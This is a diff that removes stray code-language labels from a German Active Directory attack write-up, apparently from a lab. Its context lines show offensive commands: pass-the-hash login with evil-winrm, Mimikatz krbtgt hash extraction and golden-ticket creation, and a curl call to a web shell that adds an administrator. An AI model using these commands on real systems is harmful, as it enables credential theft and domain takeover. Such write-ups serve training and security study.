@@ -126,7 +126,6 @@ whoami
 
 ### Domain Compromise via Token
 
-cmd
 
 ```cmd
 # Domain User erstellen
@@ -267,7 +266,6 @@ whoami
 
 #### PowerShell Enumeration
 
-powershell
 
 ```powershell
 # In Evil-WinRM oder lokalem PowerShell
@@ -345,7 +343,6 @@ evil-winrm -i 10.10.255.69 -u Administrator -H 15db914be1e6a896e7692f608a9d72ef
 
 #### Mimikatz starten
 
-cmd
 
 ```cmd
 mimikatz.exe
@@ -353,7 +350,6 @@ mimikatz.exe
 
 #### Debug-Privilegien aktivieren
 
-mimikatz
 
 ```mimikatz
 privilege::debug
@@ -363,7 +359,6 @@ privilege::debug
 
 #### Kerberos Ticket Informationen extrahieren
 
-mimikatz
 
 ```mimikatz
 lsadump::lsa /inject /name:krbtgt
@@ -376,7 +371,6 @@ lsadump::lsa /inject /name:krbtgt
 
 #### Golden Ticket erstellen
 
-mimikatz
 
 ```mimikatz
 # Generisches Template
@@ -399,7 +393,6 @@ kerberos::golden /User:Batman /domain:marvel.local /sid:S-1-5-21-1234567890-1111
 
 #### CMD mit Golden Ticket öffnen
 
-mimikatz
 
 ```mimikatz
 misc::cmd
@@ -655,7 +648,6 @@ curl "http://10.10.255.70/dev/back.php?c=net%20localgroup%20Administrators%20har
 
 ### Via Evil-WinRM zu Domain Admins
 
-cmd
 
 ```cmd
 # In Evil-WinRM Session
